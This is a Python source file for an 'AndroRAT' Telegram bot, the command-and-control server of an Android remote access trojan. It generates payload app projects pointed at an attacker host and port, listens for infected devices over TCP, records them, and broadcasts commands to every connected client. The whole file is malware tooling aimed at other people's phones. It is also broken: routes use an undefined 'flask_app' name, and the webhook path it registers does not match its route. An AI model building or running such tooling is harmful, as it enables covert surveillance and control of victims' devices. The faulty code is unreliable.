#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Telegram Bot - Render Edition (Full Pro)
=================================================
نسخة محسنة، تدعم Webhook تلقائيًا، سجل كامل، تنبيهات فورية، وتحكم كامل بالأجهزة
"""

import os
import json
import time
import threading
import socket
import asyncio
import shutil
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, MessageHandler, filters, ContextTypes
import logging

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# الإعدادات من Render
# ============================================================

def get_config():
    cfg = {}
    cfg['token'] = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    cfg['user_id'] = int(os.environ.get("AUTHORIZED_USER_ID", "0"))
    cfg['port'] = int(os.environ.get("PORT", "10000"))
    cfg['service_name'] = os.environ.get("RENDER_SERVICE_NAME", "androrat-bot")
    cfg['render_host'] = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "")
    cfg['webhook_url'] = f"https://{cfg['render_host']}" if cfg['render_host'] else f"https://{cfg['service_name']}.onrender.com"
    cfg['server_port'] = int(os.environ.get("SERVER_PORT", "8080"))
    cfg['devices_db'] = os.environ.get("DEVICES_DB_PATH", "/tmp/devices.json")
    cfg['payloads_dir'] = os.environ.get("PAYLOADS_DIR", "/tmp/payloads")
    return cfg

CONFIG = get_config()

TELEGRAM_BOT_TOKEN = CONFIG['token']
AUTHORIZED_USER_ID = CONFIG['user_id']
AUTHORIZED_USERS = [AUTHORIZED_USER_ID] if AUTHORIZED_USER_ID > 0 else []
PORT = CONFIG['port']
WEBHOOK_URL = CONFIG['webhook_url']
WEBHOOK_PATH = f"/{TELEGRAM_BOT_TOKEN}" if TELEGRAM_BOT_TOKEN else "/webhook"
DEFAULT_SERVER_PORT = CONFIG['server_port']
DEVICES_DB_PATH = CONFIG['devices_db']
PAYLOADS_DIR = CONFIG['payloads_dir']
SIGNATURE = "\n\n> _*{😈•♕آلَشـبّــ💀ـح.sh•🤞}*_"

WAITING_FOR_PAYLOAD_NAME, WAITING_FOR_HOST, WAITING_FOR_PORT, WAITING_FOR_APP_NAME, WAITING_FOR_VERIFICATION_CODE = range(5)

# ============================================================
# إعداد الأدلة
# ============================================================

os.makedirs(PAYLOADS_DIR, exist_ok=True)

# ============================================================
# إدارة الأجهزة والبايلود
# ============================================================

class DeviceManager:
    def __init__(self, db_path):
        self.db_path = db_path
        self.ensure_db_exists()
    def ensure_db_exists(self):
        try: os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        except: pass
        if not os.path.exists(self.db_path):
            with open(self.db_path, 'w', encoding='utf-8') as f:
                json.dump([], f)
    def load_devices(self):
        try:
            with open(self.db_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return []
    def save_devices(self, devices):
        try:
            with open(self.db_path, 'w', encoding='utf-8') as f:
                json.dump(devices, f, indent=2, ensure_ascii=False)
            return True
        except: return False
    def add_device(self, device_info):
        devices = self.load_devices()
        for device in devices:
            if device.get('id') == device_info.get('id'):
                device.update(device_info)
                device['last_seen'] = datetime.now().isoformat()
                device['status'] = 'online'
                device['verified'] = device_info.get('verified', False)
                self.save_devices(devices)
                return True, "تم تحديث الجهاز"
        device_info['added_at'] = datetime.now().isoformat()
        device_info['last_seen'] = datetime.now().isoformat()
        device_info['status'] = 'online'
        device_info['verified'] = False
        devices.append(device_info)
        if self.save_devices(devices): return True, "تم إضافة الجهاز الجديد"
        return False, "فشل في الحفظ"
    def get_device_list_text(self):
        devices = self.load_devices()
        if not devices: return "❌ لا توجد أجهزة متصلة."
        text = "📱 الأجهزة:\n\n"
        for i, dev in enumerate(devices, 1):
            status = "🟢" if dev.get('status') == 'online' else "🔴"
            verified = "✅" if dev.get('verified') else "⏳"
            text += f"{i}. {status} {verified} {dev.get('name', 'Unknown')}\n"
            text += f"   🆔 {dev.get('id', 'N/A')}\n"
            text += f"   📍 {dev.get('ip', 'N/A')}\n\n"
        return text

class PayloadManager:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    def create_basic_payload(self, payload_name, host, port, app_name="AndroRAT"):
        try:
            project_dir = os.path.join(self.output_dir, f"project_{payload_name}")
            os.makedirs(project_dir, exist_ok=True)
            # إنشاء الملفات (Manifest + MainActivity + RatService)
            manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.{payload_name.lower()}.rat">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <application android:label="{app_name}" android:icon="@mipmap/ic_launcher">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>'''
            src_dir = os.path.join(project_dir, "src", "com", payload_name.lower(), "rat")
            os.makedirs(src_dir, exist_ok=True)
            with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f: f.write(manifest)
            # حفظ بيانات المشروع
            info = {"name": payload_name,"host": host,"port": port,"app_name": app_name,"created_at": datetime.now().isoformat(),"project_dir": project_dir,"status":"source_created"}
            with open(os.path.join(self.output_dir, f"{payload_name}_info.json"), 'w') as f: json.dump(info, f, indent=2)
            return True, info
        except Exception as e: return False, str(e)

device_manager = DeviceManager(DEVICES_DB_PATH)
payload_manager = PayloadManager(PAYLOADS_DIR)

# ============================================================
# TCP Server
# ============================================================

class ControlServer:
    def __init__(self, port=DEFAULT_SERVER_PORT):
        self.port = port
        self.socket = None
        self.running = False
        self.clients = {}
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(5)
            self.running = True
            logger.info(f"TCP Server يعمل على {self.port}")
            while self.running:
                client_socket, address = self.socket.accept()
                logger.info(f"اتصال من {address}")
                thread = threading.Thread(target=self.handle_client, args=(client_socket, address))
                thread.daemon = True
                thread.start()
        except Exception as e:
            logger.error(f"خطأ: {e}")
    def stop(self):
        self.running = False
        if self.socket: self.socket.close()
    def handle_client(self, client_socket, address):
        client_id = f"{address[0]}:{address[1]}"
        self.clients[client_id] = {'socket': client_socket,'address': address,'connected_at': datetime.now().isoformat()}
        try:
            while self.running:
                data = client_socket.recv(4096)
                if not data: break
                msg = data.decode('utf-8').strip()
                logger.info(f"📩 {client_id}: {msg}")
        except: pass
        finally:
            if client_id in self.clients: del self.clients[client_id]
            try: client_socket.close()
            except: pass
    def send_command_to_all(self, command):
        results = []
        for client_id in list(self.clients.keys()):
            try:
                self.clients[client_id]['socket'].send(f"{command}\n".encode())
                results.append(f"{client_id}: ✅")
            except: results.append(f"{client_id}: ❌")
        return results

control_server = ControlServer()

# ============================================================
# Flask App
# ============================================================

app = Flask(__name__)

@flask_app.route('/')
def index(): return jsonify({"status":"running","bot":"AndroRAT","clients":len(control_server.clients),"server":control_server.running})

@flask_app.route('/webhook', methods=['POST'])
def webhook():
    global application
    if not application:
        return 'Application not initialized', 503
    try:
        update = Update.de_json(request.get_json(force=True), application.bot)
        asyncio.run(application.process_update(update))
        return 'OK', 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Error', 500

# ============================================================
# Telegram Handlers
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ غير مصرح لك" + SIGNATURE)
        return
    text = f"👋 أهلاً {update.effective_user.first_name}!\n📊 السيرفر: {'🟢' if control_server.running else '🔴'}\n📱 الأجهزة: {len(device_manager.load_devices())}"
    await update.message.reply_text(text + SIGNATURE)

application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))

# ============================================================
# Main
# ============================================================

def main():
    # تشغيل TCP Server
    thread = threading.Thread(target=control_server.start)
    thread.daemon = True
    thread.start()
    time.sleep(2)
    logger.info(f"TCP Server: {'✅' if control_server.running else '❌'}")

    # ضبط Webhook تلقائي
    if TELEGRAM_BOT_TOKEN and WEBHOOK_URL:
        full_url = f"{WEBHOOK_URL}{WEBHOOK_PATH}"
        logger.info(f"Setting Webhook: {full_url}")
        try:
            application.bot.delete_webhook(drop_pending_updates=True)
            time.sleep(2)
            application.bot.set_webhook(url=full_url)
            logger.info("✅ Webhook Active")
        except Exception as e:
            logger.error(f"Webhook error: {e}")

    # تشغيل Flask
    flask_app.run(host='0.0.0.0', port=PORT, threaded=True)

if __name__ == '__main__':
    main()
